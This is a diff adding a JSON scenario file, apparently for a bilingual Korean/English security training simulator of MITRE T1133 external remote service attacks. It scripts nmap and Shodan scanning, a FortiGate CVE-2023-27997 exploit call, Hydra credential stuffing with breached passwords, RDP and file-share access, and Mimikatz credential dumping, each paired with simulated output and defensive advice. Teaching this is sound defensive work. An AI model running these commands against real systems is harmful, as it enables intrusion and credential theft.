@@ -1,0 +1,133 @@
+{
+  "id": "T1133",
+  "title": "외부 원격 서비스 악용 시뮬레이션",
+  "titleEn": "External Remote Services Exploitation Simulation",
+  "duration": 7,
+  "phases": [
+    { "label": "🔍 서비스 스캔", "labelEn": "🔍 Service Scanning", "steps": [0] },
+    { "label": "🔑 VPN 침투", "labelEn": "🔑 VPN Compromise", "steps": [1] },
+    { "label": "🎯 RDP 접근", "labelEn": "🎯 RDP Access", "steps": [2] },
+    { "label": "🔍 탐지 & 방어", "labelEn": "🔍 Detection & Defense", "steps": [3] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(External)", "x": 50, "y": 80 },
+    { "id": "vpn", "label": "SSL-VPN\n(FortiGate)", "x": 200, "y": 30 },
+    { "id": "rdp", "label": "RDP Server\n(3389)", "x": 200, "y": 130 },
+    { "id": "dc", "label": "Domain\nController", "x": 370, "y": 30 },
+    { "id": "fileserver", "label": "File Server\n(Confidential)", "x": 370, "y": 130 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "vpn", "minStep": 1 },
+    { "from": "attacker", "to": "rdp", "minStep": 2 },
+    { "from": "vpn", "to": "dc", "minStep": 1 },
+    { "from": "rdp", "to": "fileserver", "minStep": 2 }
+  ],
+  "desktopIcons": [
+    { "name": "Hydra", "icon": "🔑" },
+    { "name": "RDP Client", "icon": "🖥️" },
+    { "name": "VPN Client", "icon": "🔒" },
+    { "name": "Nmap", "icon": "🔍" },
+    { "name": "SIEM", "icon": "📊" }
+  ],
+  "steps": [
+    {
+      "cmd": "# 외부 원격 서비스 스캔\nnmap -sV -p 22,443,3389,5900,8443 target.com\n\n# VPN 장비 식별\ncurl -sk https://vpn.target.com/remote/login | grep -i 'fortinet\\|fortigate'\n\n# Shodan으로 RDP 노출 확인\nshodan search 'port:3389 org:target-corp'",
+      "out": "[Nmap 스캔]\n22/tcp   OpenSSH 8.2 (bastion)\n443/tcp  FortiGate SSL-VPN\n3389/tcp Microsoft RDP (NLA disabled) ⚠️\n5900/tcp VNC (no auth)\n8443/tcp Citrix Gateway\n\n[VPN 식별]\nFortiGate v7.0.5 (CVE-2023-27997 취약) ⚠️\nSSL-VPN 포털 활성화\n로컬 인증 (LDAP 연동)\n\n[Shodan RDP]\n203.0.113.50:3389 - NLA disabled\n203.0.113.51:3389 - Windows Server 2019\n→ 2대 RDP 인터넷 노출 ⚠️\n\n⚠️ VPN(CVE), RDP(NLA없음), VNC(인증없음) 발견",
+      "def": "[Firewall] Port scanning on remote access services — VPN, RDP, VNC enumerated",
+      "defAction": "Tool: Nmap + Shodan\nVPN: FortiGate 7.0.5 (CVE-2023-27997)\nRDP: 2 exposed, NLA disabled\nVNC: No authentication\nSSH: Bastion server\nCitrix: Gateway on 8443\nRisk Level: High\nAction: Patch VPN, enable NLA, secure VNC",
+      "desc": "Nmap과 Shodan으로 외부 원격 서비스를 스캔합니다. FortiGate VPN CVE 취약점, NLA 미적용 RDP, 인증 없는 VNC를 발견합니다.",
+      "descEn": "Scan external remote services with Nmap and Shodan. Discover FortiGate VPN CVE, NLA-disabled RDP, and unauthenticated VNC.",
+      "stepTitle": "원격 서비스 스캔 + 취약점 식별",
+      "stepTitleEn": "Remote Service Scanning + Vulnerability ID",
+      "feynman": "건물의 모든 출입구(원격 서비스)를 확인합니다. 정문(VPN)에 금이 가 있고, 후문(RDP)은 신분증 확인(NLA) 없이 열려 있으며, 비상구(VNC)는 잠금장치가 없습니다.",
+      "feynmanEn": "Check all building entrances (remote services). Front door (VPN) has cracks, back door (RDP) has no ID check (NLA), emergency exit (VNC) has no lock.",
+      "expert": "CVE-2023-27997은 FortiGate SSL-VPN의 힙 오버플로우 RCE 취약점입니다. NLA(Network Level Authentication) 미적용 RDP는 로그인 화면 전에 취약점을 악용할 수 있습니다. VNC는 기본적으로 암호화 없이 통신합니다.",
+      "expertEn": "CVE-2023-27997 is a FortiGate SSL-VPN heap overflow RCE. RDP without NLA allows exploitation before login screen. VNC communicates without encryption by default.",
+      "defTooltip": "🔐 VPN CVE + RDP/VNC 노출!",
+      "defTooltipEn": "🔐 VPN CVE + RDP/VNC exposed!",
+      "hackerLog": { "title": "scan.log", "lines": ["[08:00:00] 원격 서비스 스캔", "[08:02:00] FortiGate CVE 발견", "[08:03:00] RDP NLA 미적용 확인", "[08:04:00] VNC 인증 없음 확인"] },
+      "terms": [
+        { "term": "NLA", "def": "Network Level Authentication, RDP 연결 전 사용자 인증을 요구하는 보안 기능" },
+        { "term": "SSL-VPN", "def": "SSL/TLS 암호화를 사용하는 VPN, 웹 브라우저로 접근 가능" }
+      ]
+    },
+    {
+      "cmd": "# FortiGate CVE-2023-27997 악용\npython3 fortigate_exploit.py --target vpn.target.com\n\n# 크리덴셜 스터핑 (유출 DB 활용)\nhydra -L vpn_users.txt -P breach_passwords.txt vpn.target.com https-form-post\n\n# VPN 터널 연결\nforticlient connect --server vpn.target.com --user jkim --pass leaked_pass",
+      "out": "[CVE-2023-27997 악용]\nFortiGate 힙 오버플로우 RCE 성공!\n→ root 쉘 획득\n→ VPN 사용자 DB 추출\n\n[VPN 사용자 DB]\n전체 VPN 사용자: 156명\nMFA 미적용: 89명 (57%) ⚠️\n\n[크리덴셜 스터핑]\n유출 DB(2024 breach) 매칭 결과:\n  jkim: P@ssw0rd2025 → VPN 접속 성공! ⚠️\n  slee: Summer2024! → VPN 접속 성공! ⚠️\n  ypark: 123456789 → VPN 접속 성공! ⚠️\n\n[VPN 터널]\n내부 IP 할당: 10.10.0.50\n접근 가능 서브넷: 10.0.0.0/8 (전체!) ⚠️\nDNS: corp.local (AD 도메인)\n\n⚠️ 3명 VPN 접근 + 내부 네트워크 전체 접근",
+      "def": "[SIEM] VPN login from suspicious IP — credential stuffing with 3 successful logins, no MFA enforcement",
+      "defAction": "Tool: CVE exploit + Hydra + FortiClient\nCVE: 2023-27997 (RCE → root)\nStuffing: 3 accounts compromised\nMFA: 57% users without MFA\nVPN: Full internal network access (10.0.0.0/8)\nDomain: corp.local\nRisk Level: Critical\nAction: Patch FortiGate, enforce MFA, restrict VPN subnet access",
+      "desc": "FortiGate CVE-2023-27997로 root 접근 후 VPN 사용자 DB를 추출합니다. 유출 DB 크리덴셜 스터핑으로 3개 계정의 VPN 접속에 성공합니다.",
+      "descEn": "Exploit FortiGate CVE for root access, extract VPN user DB. Credential stuffing with breach data yields 3 VPN logins.",
+      "stepTitle": "VPN CVE 악용 + 크리덴셜 스터핑",
+      "stepTitleEn": "VPN CVE Exploit + Credential Stuffing",
+      "feynman": "정문(VPN) 금이 간 곳(CVE)으로 관리실에 들어가 출입카드 목록을 훔칩니다. 동시에 유출된 비밀번호 목록으로 정문을 통과할 수 있는 사람 3명을 찾습니다.",
+      "feynmanEn": "Enter through the cracked front door (CVE) to steal access card lists. Simultaneously find 3 people who can pass through using leaked password lists.",
+      "expert": "CVE-2023-27997은 FortiOS SSL-VPN의 pre-auth 힙 오버플로우로, 인증 없이 원격 코드 실행이 가능합니다. 크리덴셜 스터핑은 다른 사이트에서 유출된 비밀번호를 재사용하는 공격입니다. VPN이 전체 내부 네트워크(/8)에 접근을 허용하는 것은 최소 권한 원칙 위반입니다.",
+      "expertEn": "CVE-2023-27997 is a pre-auth heap overflow in FortiOS SSL-VPN enabling unauthenticated RCE. Credential stuffing reuses passwords from other breaches. VPN allowing /8 access violates least privilege.",
+      "defTooltip": "🔐 VPN 3계정 침투 + 내부 접근!",
+      "defTooltipEn": "🔐 3 VPN accounts + internal access!",
+      "hackerLog": { "title": "vpn.log", "lines": ["[08:10:00] CVE-2023-27997 악용", "[08:10:30] root 쉘 획득", "[08:12:00] 크리덴셜 스터핑 시작", "[08:15:00] 3계정 VPN 접속 성공"] },
+      "terms": [
+        { "term": "Credential Stuffing", "def": "다른 사이트에서 유출된 자격증명을 재사용하여 로그인을 시도하는 공격" },
+        { "term": "Pre-auth RCE", "def": "인증 없이 원격 코드 실행이 가능한 취약점 (가장 위험한 유형)" }
+      ]
+    },
+    {
+      "cmd": "# VPN 터널에서 RDP 접근\nxfreerdp /v:10.0.0.5 /u:jkim /p:P@ssw0rd2025 /cert-ignore\n\n# RDP로 파일 서버 접근\nnet use \\\\10.0.0.20\\confidential$ /user:jkim P@ssw0rd2025\ndir \\\\10.0.0.20\\confidential$\n\n# 추가 크리덴셜 수집\nmimikatz.exe \"sekurlsa::logonpasswords\"",
+      "out": "[RDP 접근]\n10.0.0.5 (Workstation) RDP 성공!\n  사용자: jkim (도메인 사용자)\n  그룹: Domain Users, Finance\n\n[파일 서버]\n\\\\10.0.0.20\\confidential$ 접근 성공\n  /Finance/  재무제표 2024-2025\n  /M&A/      인수합병 문서\n  /Legal/    법무 계약서\n  /HR/       인사 기밀\n\n[Mimikatz 결과]\nadmin_svc: NTLM: a1b2c3d4...\nsql_svc: NTLM: e5f6g7h8...\njkim: NTLM: i9j0k1l2...\n\n⚠️ 재무/M&A 기밀 데이터 접근\n⚠️ 3개 추가 자격증명 탈취",
+      "def": "[SIEM] RDP session from VPN IP — financial data access + credential dumping detected on workstation",
+      "defAction": "Tool: xfreerdp + net use + Mimikatz\nRDP: jkim workstation compromised\nShares: Finance, M&A, Legal, HR data\nCredentials: 3 additional NTLM hashes\nServices: admin_svc, sql_svc accounts\nRisk Level: Critical\nAction: Terminate VPN/RDP sessions, rotate all credentials, investigate data access",
+      "desc": "VPN 터널을 통해 RDP로 내부 워크스테이션에 접근합니다. 파일 서버의 재무/M&A 기밀 데이터에 접근하고 Mimikatz로 추가 자격증명을 탈취합니다.",
+      "descEn": "Access internal workstation via RDP through VPN tunnel. Reach financial/M&A confidential data on file server and harvest additional credentials with Mimikatz.",
+      "stepTitle": "VPN→RDP 접근 + 기밀 데이터 탈취",
+      "stepTitleEn": "VPN→RDP Access + Confidential Data Theft",
+      "feynman": "정문(VPN)으로 건물에 들어온 후, jkim 사원 사무실(RDP)에 앉습니다. jkim의 권한으로 기밀 서류함(파일 서버)을 열고, 다른 사람의 열쇠도(Mimikatz) 복사합니다.",
+      "feynmanEn": "Enter through the front door (VPN), sit in jkim's office (RDP). Open confidential cabinets (file server) with jkim's access, copy others' keys (Mimikatz).",
+      "expert": "RDP를 VPN 없이 인터넷에 노출하면 BlueKeep(CVE-2019-0708) 등 RCE 취약점에 노출됩니다. NLA는 RDP 연결 전 NTLM/Kerberos 인증을 요구합니다. 기밀 파일 서버 접근은 JIT(Just-In-Time) 접근과 PAM(Privileged Access Management)으로 제한해야 합니다.",
+      "expertEn": "Exposing RDP without VPN risks BlueKeep (CVE-2019-0708) RCE. NLA requires NTLM/Kerberos auth before RDP connection. Confidential file access should be restricted with JIT access and PAM.",
+      "defTooltip": "🔐 재무/M&A 기밀 접근!",
+      "defTooltipEn": "🔐 Financial/M&A data accessed!",
+      "hackerLog": { "title": "rdp.log", "lines": ["[08:20:00] RDP 연결 시도", "[08:20:05] jkim 워크스테이션 접근", "[08:22:00] 기밀 파일 서버 접근", "[08:25:00] Mimikatz 자격증명 탈취"] },
+      "terms": [
+        { "term": "BlueKeep", "def": "CVE-2019-0708, RDP의 pre-auth RCE 취약점 (Windows 7/Server 2008)" },
+        { "term": "JIT Access", "def": "Just-In-Time 접근, 필요한 시간에만 권한을 부여하고 자동으로 회수" }
+      ]
+    },
+    {
+      "cmd": "# 원격 접근 방어 종합\n# MFA 강제 적용\nFortiGate# config user setting\n  set auth-multi-factor enable\n\n# Zero Trust 아키텍처\naz network nsg rule create --name DenyAllInbound\n\n# UEBA 알림 설정\nNew-InboxRule -Name 'VPN Anomaly' -SubjectContains 'suspicious'",
+      "out": "[MFA 적용]\n✅ 모든 VPN 사용자 MFA 강제 (TOTP/FIDO2)\n✅ RDP Gateway + MFA 적용\n✅ SSH 키 + MFA 이중 인증\n✅ 세션 타임아웃: 8시간\n\n[Zero Trust]\n✅ 디바이스 인증서 필수\n✅ 디바이스 보안 상태 검증 (EDR 활성화)\n✅ 마이크로세분화 (VPN→특정 서브넷만)\n✅ ZTNA(Zero Trust Network Access) 전환\n\n[VPN 패치 + 모니터링]\n✅ FortiGate 7.4.x 최신 패치 적용\n✅ Citrix Gateway 패치 적용\n✅ UEBA 비정상 로그인 탐지\n✅ 지리적 위치 기반 접근 제한\n\n[추가 방어]\n✅ NLA 전체 적용 (RDP)\n✅ SSH root 로그인 금지\n✅ VNC → RDP/SSH로 대체\n✅ 분기별 원격 접근 감사",
+      "def": "[SIEM] Remote access defense deployed — MFA enforced, ZTNA enabled, VPN patched, UEBA monitoring active",
+      "defAction": "Tool: MFA + ZTNA + Patching + UEBA\nMFA: TOTP/FIDO2 for all remote access\nZTNA: Device cert + posture check\nVPN: Latest patches, subnet restrictions\nRDP: NLA + RDP Gateway + MFA\nSSH: Key + MFA, no root login\nRisk Level: Low (with implementation)\nAction: Quarterly remote access audits",
+      "desc": "모든 원격 접근에 MFA를 강제하고, Zero Trust(ZTNA)로 전환합니다. VPN 패치, NLA 적용, UEBA 모니터링, 지리적 접근 제한을 적용합니다.",
+      "descEn": "Enforce MFA for all remote access, migrate to ZTNA. Apply VPN patches, NLA, UEBA monitoring, and geo-restrictions.",
+      "stepTitle": "MFA + ZTNA + VPN 패치 + UEBA",
+      "stepTitleEn": "MFA + ZTNA + VPN Patching + UEBA",
+      "feynman": "4가지 대책: 1) 정문에 이중 잠금장치(MFA) 설치, 2) 사원증+건강검진(ZTNA: 디바이스 인증+상태)으로 출입 허가, 3) 깨진 잠금장치 즉시 수리(패치), 4) 비정상 출입 패턴 실시간 감시(UEBA).",
+      "feynmanEn": "4 measures: 1) Double locks on doors (MFA), 2) ID badge + health check (ZTNA: device cert + posture), 3) Fix broken locks immediately (patching), 4) Monitor abnormal entry patterns (UEBA).",
+      "expert": "ZTNA(Zero Trust Network Access)는 사용자 신원, 디바이스 상태, 컨텍스트를 기반으로 접근을 제어합니다. FIDO2는 피싱 방지 MFA 표준으로 하드웨어 보안 키를 사용합니다. UEBA(User and Entity Behavior Analytics)는 머신러닝으로 비정상 행동을 탐지합니다.",
+      "expertEn": "ZTNA controls access based on user identity, device posture, and context. FIDO2 is a phishing-resistant MFA standard using hardware security keys. UEBA uses ML to detect abnormal behavior patterns.",
+      "defTooltip": "🔐 원격 접근 방어 체계 완성!",
+      "defTooltipEn": "🔐 Remote access defense complete!",
+      "hackerLog": { "title": "defense.log", "lines": ["[09:00:00] MFA 전체 적용", "[09:05:00] ZTNA 전환", "[09:10:00] VPN/Citrix 패치", "[09:15:00] UEBA 모니터링 활성화"] },
+      "terms": [
+        { "term": "ZTNA", "def": "Zero Trust Network Access, 사용자/디바이스/컨텍스트 기반 접근 제어" },
+        { "term": "UEBA", "def": "User and Entity Behavior Analytics, 머신러닝 기반 비정상 행동 탐지" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "fortigate_exploit",
+    "pid": 9000,
+    "children": [
+      {
+        "name": "hydra (credential stuffing)",
+        "pid": 9100,
+        "children": [
+          { "name": "xfreerdp (jkim)",  "pid": 9110, "children": [
+            { "name": "mimikatz.exe", "pid": 9111, "children": [] }
+          ] }
+        ]
+      }
+    ]
+  }
+}
